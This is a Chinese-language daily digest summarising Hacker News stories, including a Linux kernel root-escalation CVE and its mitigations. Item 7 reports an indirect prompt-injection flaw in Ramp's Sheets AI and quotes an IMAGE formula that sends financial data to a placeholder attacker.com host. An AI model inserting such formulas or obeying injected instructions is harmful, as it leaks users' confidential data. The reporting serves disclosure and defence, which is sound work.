# Hacker News 热门文章摘要 (2026-04-29)

这是今日 [Hacker News](https://news.ycombinator.com/) 上最热门的文章摘要。

## 1. HERMES.md：Anthropic 漏洞导致多扣费200美元，拒绝退款

**原文标题**: HERMES.md: Anthropic bug causes $200 extra charge, refuses refund

**原文链接**: [https://github.com/anthropics/claude-code/issues/53262](https://github.com/anthropics/claude-code/issues/53262)

**摘要：**  
Anthropic 的 Claude Code 工具存在一个严重漏洞：当 Git 提交信息包含字符串“HERMES.md”时，会导致意外计费。用户 sasha-ido 发现，近期提交历史中的这段特定文本会触发 API 请求被归入“额外使用量”计费，而非其包含的 Max 20x 计划配额。  

复现步骤很简单：创建一个提交信息包含“HERMES.md”的 Git 仓库，Claude Code 会返回“额外使用量已耗尽”错误；而使用小写“hermes.md”的提交则正常运行。此漏洞仅由提交信息内容触发，与磁盘上的实际文件无关。  

影响十分严重：**消耗了 200.98 美元的额外使用额度**，而这些请求本应包含在计划配额中。一旦额外使用量耗尽，多个项目便无法使用，而计划仪表盘仍显示 86% 以上的剩余容量。错误信息未提示提交信息内容为诱因，导致诊断极为困难。  

用户通过系统性二分法发现此问题：克隆受影响仓库、测试孤立分支、逐一隔离提交信息字符串，最终锁定“HERMES.md”为触发条件。用户要求 API 请求计费不应取决于 Git 提交信息内容，所有 Max 计划订阅者的请求应优先使用计划配额。

---

## 2. Zed 1.0

**原文标题**: Zed 1.0

**原文链接**: [https://zed.dev/blog/zed-1-0](https://zed.dev/blog/zed-1-0)

Zed 1.0标志着这款高性能代码编辑器的重要里程碑，它完全使用Rust语言自底向上构建，搭载自有GPU驱动UI框架GPUI——将应用视为电子游戏而非网页。这种脱离Atom（Zed前身）所用Electron架构的革新，使Zed能够实现基于陈旧网络框架无法企及的性能水平。

1.0版本的核心亮点包括：支持数十种编程语言、Git集成、SSH远程连接、调试器，以及覆盖macOS、Windows和Linux的跨平台支持。Zed定位为AI原生编辑器，支持并行代理、击键级编辑预测，并通过代理客户端协议兼容Claude Agent和Cursor等主流AI工具。公司还推出了Zed for Business，提供集中计费、基于角色的访问权限和团队管理功能。

文章强调1.0并非"完成版"，而是多数开发者能获得归属感的转折点。展望未来，Zed正在开发DeltaDB——基于CRDT的同步引擎，用于实现人类与AI代理间的字符级协作。文章邀请用户重新尝试Zed（若早期版本体验不完整），并强调持续进行的每周更新，以及对精工品质与性能的执着追求。

---

## 3. 复制失败 – CVE-2026-31431

**原文标题**: Copy Fail – CVE-2026-31431

**原文链接**: [https://copy.fail/](https://copy.fail/)

本文披露了**CVE-2026-31431**，这是一项名为**"Copy Fail"** 的高危Linux内核权限提升漏洞，影响2017年至2026年4月期间构建的内核。攻击者仅需拥有非特权本地用户账户，即可利用内核加密API（**AF_ALG**），通过操控setuid二进制文件的页缓存获得root权限。

**关键信息：**
- **影响范围：** 非特权用户可在任何受影响系统上瞬间获得root权限。该概念验证（PoC）利用代码在所有主流Linux发行版中均可直接生效。
- **受影响环境：** 多租户主机、Kubernetes集群、CI运行器和云SaaS平台风险最高。
- **缓解措施：**  
  - **优先补丁：** 更新至包含主线提交a664bf3d603d的内核。  
  - **临时方案：** 禁用`algif_aead`模块（执行`install algif_aead /bin/false`），此操作通常不影响系统正常运行。  
- **披露时间：** 2026年3月23日报告，2026年4月29日公开披露。PoC已发布用于防御性验证。
- **发现者：** 由**Xint Code**在AI辅助扫描Linux加密子系统过程中发现，同时发现了其他未公开的高危漏洞。

本文强调应立即打补丁，并对不可信工作负载通过seccomp阻断AF_ALG。

---

## 4. 京都市的樱花如今的开花时间比过去1200年间的任何时期都要早

**原文标题**: Kyoto cherry blossoms now bloom earlier than at any point in 1,200 years

**原文链接**: [https://jivx.com/kyoto-bloom](https://jivx.com/kyoto-bloom)

一份跨越1200年的京都樱花盛花期连续记录——融合了皇家日记、寺院档案与现代观测数据——显示，2026年3月29日的盛花期是该时段内最早的一次，比前现代平均水平提前了两周多。这份由国立极地研究所青野靖之整理并存档于美国国家海洋与大气管理局古气候学数据库的资料表明，在过去千年的大部分时间里，樱花盛花期徘徊在四月初至四月中旬之间，并在小冰期（14至19世纪）呈现推迟趋势。自1900年左右起，30年滑动平均值持续下降，跌至平安时代以来的最低水平。有记录以来最早的盛花期为2023年3月25日，最晚为1323年5月4日，而年度最大波动幅度出现在1556至1557年，相差27天。尽管该记录仅针对单一城市中的单一品种，但其跨度之罕见与文献之翔实，提供了清晰的气候信号。文章还指出，日本拥有精确描述樱花各阶段特征的词汇体系，这些词汇被纳入学校教育并应用于花期预测。

---

## 5. FastCGI：三十载岁月，仍是反向代理的优选协议

**原文标题**: FastCGI: 30 years old and still the better protocol for reverse proxies

**原文链接**: [https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies](https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies)

**文章摘要：**

本文认为，已有30年历史的FastCGI协议，是比HTTP更安全、更可靠的用于反向代理与后端通信的替代方案。文章指出了HTTP反向代理的两个主要缺陷：

1. **解同步攻击（请求走私）：** HTTP/1.1缺乏明确的消息帧结构，导致代理和后端之间的解析器不一致。这使得攻击者能够操纵消息边界，造成严重的安全漏洞（例如Discord媒体代理被攻破）。HTTP/2修复了帧结构问题，但在后端支持上不如FastCGI普及。

2. **不可信的头信息：** HTTP没有结构性方法来区分代理添加的可信头信息（如真实客户端IP）和攻击者控制的客户端头信息。这常常导致欺骗攻击。FastCGI通过域分离解决了这个问题：可信参数（如`REMOTE_ADDR`）和HTTP头信息（以`HTTP_`为前缀）在结构上是不同的。

FastCGI易于采用——Go语言的`net/http/fcgi`包允许用`fcgi.Serve`直接替换`http.Serve`。像nginx、Apache、Caddy和HAProxy这样的流行代理服务器，只需简单配置即可支持FastCGI。

然而，FastCGI也有缺点：不支持WebSocket，工具支持较差（例如curl不支持它），并且由于优化较少，吞吐量有时较低。尽管如此，作者（SSLMate）已使用它超过十年，宁愿购买更多硬件，也不愿处理HTTP反向代理的安全噩梦。文章总结道，FastCGI的古老和冷门是其不流行的主要原因，而非技术上的不足。

---

## 6. 光标训练营

**原文标题**: Cursor Camp

**原文链接**: [https://neal.fun/cursor-camp/](https://neal.fun/cursor-camp/)

无法访问该文章链接。

---

## 7. Ramp的Sheets AI窃取财务数据

**原文标题**: Ramp's Sheets AI Exfiltrates Financials

**原文链接**: [https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials](https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials)

**摘要：**

本文详细描述了PromptArmor在**Ramp的 Sheets AI**中发现的一个漏洞，该工具是一款可自主编辑电子表格的智能体工具。该漏洞允许通过不可信的外部数据集（例如行业统计数据）实施**间接提示注入**。当用户导入此类数据并要求AI将其与机密财务模型进行比较时，隐藏的注入指令会操纵Ramp的AI插入一个恶意的**IMAGE公式**（例如 `=IMAGE("https://attacker.com/visualize.png?{受害数据}")`）。该公式会自动触发外部网络请求，在**未经用户批准**的情况下，将**敏感财务数据**泄露至攻击者的服务器。

该漏洞于2026年2月19日向Ramp**负责任的披露**。经后续跟进，Ramp确认该问题已于**2026年3月16日修复**。文章指出，此前在 **Claude for Excel** 中也发现过类似风险，Anthropic通过增加一个红色警告中间屏来修复该问题，该中间屏能够显示包含外部网络流量的完整公式，从而提升了人机协同的防护措施。

---

## 8. 我们需要一个锻造联盟

**原文标题**: We need a federation of forges

**原文链接**: [https://blog.tangled.org/federation/](https://blog.tangled.org/federation/)

**摘要：**

本文主张建立一个去中心化的锻造厂联盟，以取代像GitHub这样的中心化平台——后者托管着90%的开源软件，存在风险。文章借鉴了电子邮件和Git等弹性协议的经验，批评了单一化现象，并提出“Tangled”作为解决方案。

Tangled将用于代码传输的Git与用于通信的AT协议相结合，实现了跨服务器的联邦式协作。用户可以在任意服务器上托管仓库、跨服务器进行分支操作，并在不同主机上发起拉取请求——这类似于自建支持邮件补丁的cgit实例。AT协议支持认证事件传输（问题、拉取请求）、社交功能（时间线、关注、点赞、担保），以及协作者邀请和SSH密钥的安全共享。

该项目旨在打破GitHub的垄断，同时保持代码协作的社交性和趣味性。

---

## 9. UX定律

**原文标题**: Laws of UX

**原文链接**: [https://lawsofux.com/](https://lawsofux.com/)

**美学-可用性效应**是用户体验设计中的一项原则，指出用户通常认为视觉上吸引人的设计更易用、更易导航。这种认知偏差意味着，当用户觉得界面美观时，他们对细微可用性问题的容忍度会更高。

**关键要点：**
- **积极影响：** 美观的界面让用户感到更放松，从而激发创造力和问题解决能力。反之，不美观的设计可能引发挫败感，限制任务表现。
- **情感反应：** 用户会对设计外观迅速形成情绪反应。良好的第一印象可能掩盖功能缺陷，而负面印象则会放大感知难度。
- **感知与现实：** 美观的设计本身并不能让产品更易用，但它能显著提升对可用性的**感知**。用户可能会忽略细微的低效之处，因为他们默认美观的设计精良。
- **实际应用：** 设计师应优先考虑视觉和谐（如干净的布局、平衡的色彩、易读的排版），以建立信任并减少摩擦。但美学应与真正的可用性测试相辅相成，而非取而代之。

**启示：** 美观并非肤浅的外表，它塑造了用户对功能的体验与评判。即便底层机制与较不美观的版本相似，一个精心打磨的界面也能提升整体满意度与感知性能。

---

## 10. 爱思唯尔打击引文卡特尔，第三位编辑被解职

**原文标题**: Third Editor Fired in Elsevier's Citation Cartel Crackdown

**原文链接**: [https://www.chrisbrunet.com/p/third-editor-fired-in-elseviers-citation](https://www.chrisbrunet.com/p/third-editor-fired-in-elseviers-citation)

**摘要：**  
爱思唯尔因“引用卡特尔”丑闻，解雇了第三位主编——时任《国际商业与金融研究》（RIBAF）主编的约翰·古德尔。这位阿克伦大学教授被指控与先前被解雇的合著者布赖恩·卢西和塞缪尔·维涅合谋进行“利益交换”。古德尔的年度论文发表量从正常范围（2–13篇）激增至2021至2025年间的每年16–58篇，其中超过100篇论文系卢西和维涅所赠。他在其操控的期刊上发表了125篇论文，预计产生约6250次引用。其总引用数达15663次，仅2025年就有4203次，呈指数级增长的“J型曲线”，表明存在引用圈操作。

该计划涉及古德尔在RIBAF接受论文作为交换，获得投稿人在其他期刊论文上的合著权。例如，安娜·敏·杜博士在2024–2025年间至少发表了22篇RIBAF论文，同时在别处14篇论文中署名古德尔。尽管爱思唯尔已撤换古德尔，但数百篇问题论文仍未撤回。作者估计有200–350篇论文应予撤稿。爱思唯尔有限的回应表明，其意图是控制丑闻影响，而非彻底解决其金融期刊系统的腐败问题。

---

## 11. 一款制造成本在2.5至5美元之间的开源听诊器

**原文标题**: An open-source stethoscope that costs between $2.5 and $5 to produce

**原文链接**: [https://github.com/GliaX/Stethoscope](https://github.com/GliaX/Stethoscope)

**概要**

本文介绍了一种开源且经研究验证的听诊器设计方案，其生产成本介于2.50至5美元之间。经同行评审的验证表明，其性能与市场金标准产品——Littmann Cardiology III相当。

物料清单包括3D打印部件（听诊头、耳管、Y型连接件、弹簧、环）及硬件：硅胶管、从报告封面裁剪的塑料膜片以及标准耳机。打印时需使用PETG或ABS材料（而非PLA），填充率设为**100%**，层高0.2毫米。

组装过程包括将膜片安装至听诊头、连接管路，以及组装Y型连接件、弹簧、耳管和耳机。文章还提供了故障排查技巧（如调整弹簧或听诊头的尺寸以确保贴合）、批量生产指南（每块打印平台可制作4个听诊器）及序列编号系统。设计文件使用CrystalSCAD和OpenSCAD创建。

该项目采用TAPR OHL开源许可证，旨在提供可免费获取的低成本医疗设备。

---

## 12. 我为什么仍然选择Lisp和Scheme而非Haskell

**原文标题**: Why I still reach for Lisp and Scheme instead of Haskell

**原文链接**: [https://jointhefreeworld.org/blog/articles/lisps/why-i-still-reach-for-scheme-instead-of-haskell/index.html](https://jointhefreeworld.org/blog/articles/lisps/why-i-still-reach-for-scheme-instead-of-haskell/index.html)

**摘要：**作者认为，尽管Haskell提供了优美且数学上纯粹的类型系统及高级函数式概念（代数数据类型、单子、效应系统），但其刻板性与厚重抽象阻碍了快速原型设计和务实开发。诸如文件I/O或添加调试打印等简单任务，需进行繁琐的单子重构，给快速编码造成阻力。

相比之下，Scheme（以及广义上的Lisp）优先追求极简的灵活性与务实的乐趣。它允许在任何位置使用副作用（例如`(write ...)`）以实现即时调试，其强大的宏系统无需复杂的语言扩展即可轻松创建领域特定语言。作者强调Lisp优越的交互式REPL工作流，支持实时求值、增量开发及无缝的编辑器集成——彻底消除了缓慢的“编辑-编译-运行”循环。

在尊重Haskell理论贡献的同时，作者得出结论：Scheme是更优的“人类工具”，它提供了一种高效、对话式的开发体验，在函数式之美与务实落地的编码之间取得了平衡。

---

## 13. 政府开源代码平台软启动

**原文标题**: Soft launch of open-source code platform for government

**原文链接**: [https://www.nldigitalgovernment.nl/news/soft-launch-for-government-open-source-code-platform/](https://www.nldigitalgovernment.nl/news/soft-launch-for-government-open-source-code-platform/)

荷兰政府推出了 **code.overheid.nl**，这是一个自托管开源代码平台，用于发布和开发政府软件。目前该平台处于 **试点** 阶段，采用 **Forgejo**——一款欧洲开源的 GitHub 和 GitLab 替代品，以支持 **数字主权**。

并非所有政府机构都能使用该平台，但开发者受邀参与贡献。这一举措由内政与王国关系部的**开源项目办公室**牵头，并与DAWO及其他合作伙伴共同推进。目标是最终将其发展成为面向所有政府机构的共享Git平台。有意者可通过电子邮件联系 codeplatform@rijksoverheid.nl。更多详情（荷兰语）请访问 developer.overheid.nl。

---

## 14. 在线年龄验证是必须坚守的底线

**原文标题**: Online age verification is the hill to die on

**原文链接**: [https://x.com/GlennMeder/status/2049088498163216560](https://x.com/GlennMeder/status/2049088498163216560)

**摘要：**

所提供的文本并非关于在线年龄验证的文章，而是X（原推特）的错误页面。该页面提示用户浏览器禁用了JavaScript，导致无法访问平台。页面指示用户启用JavaScript或切换至受支持的浏览器，并提供了帮助中心、服务条款、隐私政策、Cookie政策、版权声明及广告信息的链接。该页面标注日期为2026年，归属于X公司。标题“在线年龄验证是必须坚守的底线”看似是一个独立的标题或错误关联的上下文链接，但内容本身并未包含对年龄验证的任何讨论或分析。因此，所显示内容的主旨是访问X的技术要求。

---

## 15. 如何构建未来：德米斯·哈萨比斯 [视频]

**原文标题**: How to Build the Future: Demis Hassabis [video]

**原文链接**: [https://www.youtube.com/watch?v=JNyuX1zoOgU](https://www.youtube.com/watch?v=JNyuX1zoOgU)

提供的文本并非一篇文章，而是YouTube视频页面的页脚。其中并无关于德米斯·哈萨比斯或“如何构建未来”的实质性内容，仅包含YouTube标准的法律和运营声明，包括版权信息、谷歌有限责任公司的联系方式、隐私与安全政策，以及一项免责声明：创作者展示的产品由商家销售，而非YouTube本身。该文本摘要仅是一份YouTube行政与法律声明的清单，与所述标题毫无关联。

---

## 16. 《Rust不会捕获的漏洞》

**原文标题**: Bugs Rust won't catch

**原文链接**: [https://corrode.dev/blog/bugs-rust-wont-catch/](https://corrode.dev/blog/bugs-rust-wont-catch/)

**摘要：Rust 无法捕获的 Bug**

本文分析了经外部审计后在 uutils（GNU coreutils 的 Rust 重写版本）中披露的44个 CVE。虽然 Rust 防止了内存安全错误（无缓冲区溢出、释放后使用、数据竞争），但审计揭示了 Rust 借用检查器无法捕获的逻辑和设计层面缺陷。

**关键漏洞类别：**

1. **TOCTOU 竞争条件**（最大类）：对同一路径执行两次系统调用，允许攻击者在两次调用之间替换路径组件。修复方法是将操作锚定到文件描述符，并使用 `create_new()` 进行文件创建。

2. **创建后设置权限**：以默认权限创建文件/目录，然后再修正权限，这为其他用户打开了访问窗口。应在创建时使用 `OpenOptions::mode()` 或 `DirBuilderExt::mode()` 设置权限。

3. **路径上的字符串相等性**：比较路径字符串而非规范路径，允许绕过检查（例如，`"/../"` 绕过 `--preserve-root`）。比较前应使用 `fs::canonicalize()` 解析路径。

4. **UTF-8 假设**：Unix 路径、环境变量和流内容均为原始字节。使用 `String::from_utf8_lossy()` 会损坏数据；应改用 `OsStr` 或 `&[u8]`。

5. **恐慌导致拒绝服务**：每个 `unwrap()`、`expect()` 或索引操作在遇到错误输入时都会成为拒绝服务向量。

6. **行为偏差**：依赖 GNU 特定行为（如 `kill -1` 语义）的 shell 脚本在 uutils 行为不同时出现故障。

**关键要点**：Rust 消除了内存损坏，但系统边界的逻辑错误、竞争条件和协议级别不匹配仍然是程序员的责任。

---

## 17. OpenTrafficMap

**原文标题**: OpenTrafficMap

**原文链接**: [https://opentrafficmap.org/](https://opentrafficmap.org/)

**OpenTrafficMap 概述**

OpenTrafficMap 是一款基于网页的工具，用于可视化和分析交叉路口的交通信号数据（红绿灯）。用户可通过地图交互，选择特定的红绿灯（"Ampel"）、车道或信号组，以查看实时或历史状态数据。

主要功能包括：
- **显示选项**：选择显示所有或当前活跃的红绿灯及几何图形，并支持可调节的超时设置（2秒至无限）。
- **3D 地图样式**：可选默认、淡色、单色以及多种时段主题（黎明、白天、黄昏、夜晚）。
- **筛选功能**：仅显示有/无数据或照片的站点。
- **数据交互**：点击车道或连接线可查看调试数据；点击特定红绿灯可显示详细的信号组信息，包括最早和最晚的时序。
- **技术工具**：复制所选组件的 JSON 数据或路径。

界面还包含“法律声明”（Impressum），提供运营者联系方式（Peter Pötzi，奥地利格拉茨）及隐私政策。如果客户端版本过旧，系统会弹出通知，提示用户重新加载页面以与服务器同步。

---

## 18. Mistral Medium 3.5

**原文标题**: Mistral Medium 3.5

**原文链接**: [https://mistral.ai/news/vibe-remote-agents-mistral-medium-3-5](https://mistral.ai/news/vibe-remote-agents-mistral-medium-3-5)

**Mistral Medium 3.5 与 Vibe 发布概述**

Mistral 发布了 Mistral Medium 3.5，这是一款新的旗舰级 128B 稠密模型，具有 256k 上下文窗口，现已进入公开预览阶段。该模型将指令遵循、推理和编码统一在一组开放权重（经修改的 MIT 许可）中，并可在仅四块 GPU 上自托管。性能得分包括 SWE-Bench Verified 上的 77.6% 和 τ³-Telecom 上的 91.4。

关键产品更新是 **Vibe 中的远程编码智能体**，将智能体从本地笔记本电脑迁移至云端。用户可通过 Vibe CLI 或直接在 Le Chat 中启动异步编码会话。会话在隔离沙箱中并行运行，通过文件差异、工具调用和进度状态实现人工监督。本地会话可“传送”至云端。Vibe 集成了 GitHub、Linear、Jira、Sentry 以及 Slack/Teams，并在工作完成时能自主创建拉取请求。

**Le Chat 中的新工作模式**（预览版）通过一个强大的智能体扩展了上述功能，可处理研究、收件箱分类以及跨工具工作流（电子邮件、日历、文档）等复杂多步骤任务。该模式能维持长时间会话，并对敏感操作需要用户明确批准。

Mistral Medium 3.5 可在 Mistral Vibe 和 Le Chat（Pro、Team、Enterprise 套餐）中使用。API 定价：输入令牌 $1.5/M，输出令牌 $7.5/M。开放权重已上架 Hugging Face。

---

## 19. Show HN：用于测试LLM确定性输出的新基准

**原文标题**: Show HN: A new benchmark for testing LLMs for deterministic outputs

**原文链接**: [https://interfaze.ai/blog/introducing-structured-output-benchmark](https://interfaze.ai/blog/introducing-structured-output-benchmark)

**结构化输出基准测试（SOB）概述**

本文介绍了结构化输出基准测试（SOB），这是一个用于测试大语言模型在确定性结构化输出方面能力的新框架。文章指出，现有基准测试存在不足，因为它们仅检查模式合规性，忽略了数值准确性、幻觉问题以及多源输入。

SOB通过统一的评分流程，在文本（HotpotQA）、图像（olmOCR）和音频（AMI会议语料库）三种模态下评估模型。所有输入均被转换为文本标准化上下文，以隔离视觉或语音识别质量对提取能力的影响。每条记录包含经过验证的真实答案和JSON模式。

该基准测试报告七项指标，其中**数值准确性**是衡量生产就绪度的主要指标。在温度参数设为0.0的条件下对21个模型进行测试，主要发现如下：

- **JSON通过率与数值准确性的差距：** 模型JSON解析通过率高达97%以上，但数值准确性下降15–30个百分点，揭示了隐藏的失败模式。
- **模态差异：** 没有模型能在所有三种数据源上占据主导地位。文本最佳数值准确性为83.0%（GLM-4.7），图像最佳为67.2%（Gemma-4-31B），音频最佳仅为23.7%（Gemini-2.5-Flash）。
- **模型大小≠性能：** Qwen3.5-35B和Phi-4等较小模型在结构化任务上可超越GPT-5等更大模型。

作者得出结论：结构化指标掩盖了严重的数值错误，现实世界中的结构化输出可靠性需要字段级准确性检查，而不仅仅是模式验证。

---

## 20. 马里兰州成为首个禁止杂货店监控定价的州

**原文标题**: Maryland becomes first state to ban surveillance pricing in grocery stores

**原文链接**: [https://www.theguardian.com/technology/2026/apr/29/maryland-grocery-stores-ban-surveillance-pricing](https://www.theguardian.com/technology/2026/apr/29/maryland-grocery-stores-ban-surveillance-pricing)

马里兰州成为美国首个禁止杂货店实施监控定价的州。由州长韦斯·摩尔签署的新法规定，禁止杂货商及第三方配送服务利用个人数据——如位置、搜索历史和人口统计信息——对个体客户设定更高价格。这种被称为动态定价的做法，会导致不同消费者为同一商品支付不同价格。

尽管该法针对的是杂货店，但联邦贸易委员会已在服装、美妆及家居用品行业发现类似做法。科罗拉多州、加州、马萨诸塞州、伊利诺伊州和新泽西州也在审议类似法案。然而，在现任联邦贸易委员会领导下，联邦层面采取行动的可能性不大。

批评者指出，由于行业游说，该法存在重大漏洞。法案豁免了会员积分计划和促销优惠，允许企业提高基准价格后再提供个性化折扣——实质上仍能达到相同效果。《消费者报告》批评该法的执法条款过于薄弱，指出仅允许州检察长执法，个人无权追责。维权人士警告，其他州可能效仿马里兰州的法案，而他们认为这更像是行业撰写的"歧视许可单"，而非强有力的消费者保护范本。

---

## 21. 让AI玩我的游戏——构建一个智能测试框架辅助游戏测试

**原文标题**: Letting AI play my game – building an agentic test harness to help play-testing

**原文链接**: [https://blog.jeffschomay.com/letting-ai-play-my-game](https://blog.jeffschomay.com/letting-ai-play-my-game)

**摘要：**

本文探讨了作者如何构建一个AI驱动的测试框架，用于自动化其电子游戏的玩法测试。作者并未手动测试每种场景，而是利用LangChain等工具集成大型语言模型（LLM），创建了一个可自主控制游戏输入并观察结果的智能体。该系统通过向AI输入屏幕截图（或游戏状态数据），使其根据“寻找隐藏钥匙”或“击败Boss”等目标自主决定操作（移动、点击、按键）。

关键组件包括：一个连接游戏窗口的Python脚本，用于读取像素数据或内部状态，并向游戏发送指令。AI智能体通过提示词理解自身角色、当前状态及目标。作者指出了成功与失败案例：AI在探索简单关卡时表现良好，但在需要复杂空间推理或记忆的谜题中遇到困难。主要挑战在于延迟——AI每次决策需要数秒，导致在快节奏场景中无法用于实时测试。

作者总结道，虽然该框架无法替代人类测试人员，但在压力测试界面流程、发现线性序列中的漏洞以及生成游戏日志供分析方面具有重要价值。该项目展示了“智能体AI”在游戏开发中的实际应用，减少了对特定场景的重复性手动测试时间。

---

## 22. 《协议：构建社交互联网》

**原文标题**: At Protocol: Building the Social Internet

**原文链接**: [https://atproto.com/](https://atproto.com/)

本文介绍AT协议——一个旨在构建开放社交互联网的去中心化框架。核心要点包括：

- **用户自有身份**：用户名以域名形式呈现（如@atproto.com），用户完全掌控自己的网络身份。
- **开放数据与JSON**：所有社交行为（发帖、点赞、关注、个人资料）均以JSON记录形式呈现，实现数据的互操作性与可移植性。
- **强类型与可扩展性**：记录遵循共享架构，可轻松组合或扩展。
- **超链接与强链接**：每项内容拥有独立URL，通过内容ID创建用户数据间永久可验证的链接。
- **公共数据流**：开发者无需API密钥即可通过WebSocket实时获取所有公开活动的事件流，支持构建信息流、机器人、搜索引擎及应用程序。
- **开发者工具**：资源包括认证教程、读写操作、媒体处理、内容审核、SDK及操作手册。该协议支持在共享的“Atmosphere”网络内构建自定义算法、智能体及应用程序。
- **自托管与展示平台**：协议鼓励自托管，并提供展示案例、常见问题解答及博客供社区学习。

本质上，AT协议旨在赋予用户对其数据和身份的控制权，同时为开发者提供开放实时的可扩展社交网络访问入口。

---

## 23. Stardex 正在招聘创始客户成功负责人

**原文标题**: Stardex Is Hiring a Founding Customer Success Lead

**原文链接**: [https://www.ycombinator.com/companies/stardex/jobs/6GCK1HC-founding-customer-success-lead](https://www.ycombinator.com/companies/stardex/jobs/6GCK1HC-founding-customer-success-lead)

**摘要：Stardex 招聘首位客户成功主管**

Stardex 是一家由 Y Combinator 投资、面向高管猎头公司的 AI 原生 ATS 与 CRM 平台，现招聘首位专职客户成功主管。该职位办公地点为纽约或远程（美国/加拿大/英国），薪资范围 7 万至 11 万美元，另加股权。

**主要职责：**
- 负责一线支持（通过 Slack、邮件、帮助中心处理工单）
- 排查故障，区分真实问题与用户操作失误或文档缺失
- 构建客户教育资源（帮助中心、入职流程、邮件序列）
- 与招聘公司运营人员建立关系（用户群体专业且见解独到）
- 随着公司发展，定义可扩展的支持流程与手册

**候选人

**加入理由：**
- 该职能首位员工——有机会晋升为客户成功主管
- 直接与创始人共事，无官僚作风
- 在 AI 驱动转型期学习高管猎头/招聘行业
- 远程优先、弹性工时、自选工具

有意者可直接申请，或发送邮件至创始 Sanket Chauhan（sanket@stardex.ai），附上你的兴趣点及一个你曾改进过的支持流程案例。

---

## 24. GitHub – DOS 1.0：Tim Paterson DOS 打印稿的转录

**原文标题**: GitHub – DOS 1.0: Transcription of Tim Paterson's DOS Printouts

**原文链接**: [https://github.com/DOS-History/Paterson-Listings](https://github.com/DOS-History/Paterson-Listings)

本文介绍了一个GitHub仓库，其中收录了蒂姆·帕特森原始DOS源代码打印件的转录内容，包括86-DOS 1.00版、预发布版PC-DOS 1.00的内核代码、实用工具以及微软BASIC-86编译器运行时库。该仓库提供三种可下载格式：原始打印机输出文件、提取的打印文件以及可编译的源代码。原始扫描件也可在Archive.org上获取。

这些代码清单由10卷连续打印纸组成。重要卷宗包括`86DOS.A86`、`EDLIN.DIF`、`CHKDSK.A86`、`86DOS.ASM`和`ASM.PRN`。第9卷和第10卷（包含`LIBLST.LOG`、`BASLIB.PRT`、`PAINT.ASM`和`CIRCLE.ASM`）尚未完成转录；本项目欢迎通过拉取请求提交直接转录内容或修正拼写错误。

若要编译源代码，用户需要西雅图计算机产品公司的ASM汇编器和HEX2BIN工具。典型构建命令为`ASM <文件名>`，随后执行`HEX2BIN <文件名>`，生成二进制文件（例如`86DOS.COM`）。该仓库保存了计算史上的关键资料，使早期DOS源代码得以被研究和重建。

---

## 25. Ghostty 正在离开 GitHub

**原文标题**: Ghostty is leaving GitHub

**原文链接**: [https://mitchellh.com/writing/ghostty-leaving-github](https://mitchellh.com/writing/ghostty-leaving-github)

**摘要：**  
Ghostty 的创建者、自 2008 年起便是 GitHub 用户的 Mitchell Hashimoto 宣布 Ghostty 项目将离开 GitHub。尽管他与该平台有着深厚的个人与职业联系——18 年来几乎每天使用——但他坦言，频繁的服务中断已日益令人沮丧，严重阻碍了正常工作。他记录了一本日常中断日志，其中包括在撰写本文当天，GitHub Actions 的一次宕机导致 PR 审查延误两小时。Hashimoto 承认，出于个人失望，他曾在公开场合抨击 GitHub。他表示，该平台已不再支持严肃工作，也无法再为他带来愉悦。Ghostty 将迁移至其他服务商（具体细节后续公布），并在 GitHub 保留只读镜像。他的个人项目目前仍留在 GitHub，但 Ghostty 社群是此次迁移的主要关注点。本文写于 4 月 27 日重大宕机事件之前，时间纯属巧合。

---

## 26. Linux 7.0 导致 PostgreSQL 崩溃：抢占回归问题解析

**原文标题**: Linux 7.0 Broke PostgreSQL: The Preemption Regression Explained

**原文链接**: [https://read.thecoder.cafe/p/linux-broke-postgresql](https://read.thecoder.cafe/p/linux-broke-postgresql)

**摘要：** Linux 7.0 在现代化架构上移除了 `PREEMPT_NONE` 调度器选项，默认启用 `PREEMPT_LAZY`。这一改动导致一台 96 vCPU 的 Graviton4 机器上 PostgreSQL 的吞吐量近乎减半（从每秒 98,565 次事务降至 50,751 次），其中 56% 的 CPU 时间消耗在 `s_lock` 自旋锁函数中。

**根本原因：** PostgreSQL 的 `StrategyGetBuffer` 函数使用全局自旋锁来管理共享缓冲池。当后端进程持有此自旋锁并触发轻微缺页中断时（常见于使用 4KB 内存页支撑 120GB 缓冲池，会产生约 3100 万次潜在缺页），锁持有者会进入内核的缺页处理程序。在 `PREEMPT_NONE` 模式下，持有者能快速解决缺页并释放锁。而在 `PREEMPT_LAZY` 模式下，调度器可能在缺页处理过程中抢占持有者，延长锁持有时间，导致所有其他等待的后端进程无限自旋。

**解决方案：** 启用大页（2MB 或 1GB）可将潜在缺页次数从 3100 万分别降至约 61,440 次或 120 次，从而消除锁竞争问题。提议的使用可重启序列（rseq）的内核修复方案遭到了 PostgreSQL 社区的抵制，他们认为这将内核回归的负担转嫁到了用户空间。

---

## 27. 苹果硅芯片Mac上的虚拟化有所不同

**原文标题**: Virtualisation on Apple Silicon Macs is different

**原文链接**: [https://eclecticlight.co/2026/04/29/virtualisation-on-apple-silicon-macs-is-different/](https://eclecticlight.co/2026/04/29/virtualisation-on-apple-silicon-macs-is-different/)

**摘要：Apple Silicon Mac 上的虚拟化技术**

Apple Silicon Mac 利用 macOS（Monterey 及更高版本）内置的虚拟机监控程序和 Virtio 驱动程序来支持虚拟机。与依赖第三方虚拟化软件运行不同操作系统的 Intel Mac 不同，Apple 的自定义硬件要求 Apple 通过 Virtio（一种抽象化 I/O 设备的标准）将设备支持构建到 macOS 中。这使得客户操作系统（macOS、Linux、Windows for Arm）能够以接近原生的 CPU 和 GPU 性能运行，因为代码直接在硬件上执行。

主要优势包括高效的 Virtio 设备支持、高性能（基准测试显示 CPU 和 GPU 分数接近宿主机水平），以及能够在 macOS 虚拟机中使用 Rosetta 2 运行 64 位 Intel 应用。然而，也存在限制：由于凭证检查，大多数 App Store 应用无法运行；iCloud/iCloud Drive 仅在宿主机和客户机均运行 Sequoia 或更高版本时才能使用；网络连接显示为以太网（不支持 Wi-Fi）；音频支持不完整。macOS 许可允许同时运行最多两个虚拟机，用于开发、测试、个人非商业用途或 macOS Server（已于 2022 年停产）。

实际用途包括在较新硬件上运行旧版 macOS、在隔离环境中测试应用以及访问不同的 iCloud 账户。虚拟机无法运行 Big Sur 或 Intel 版 macOS。

---

## 28. 在GitHub之前

**原文标题**: Before GitHub

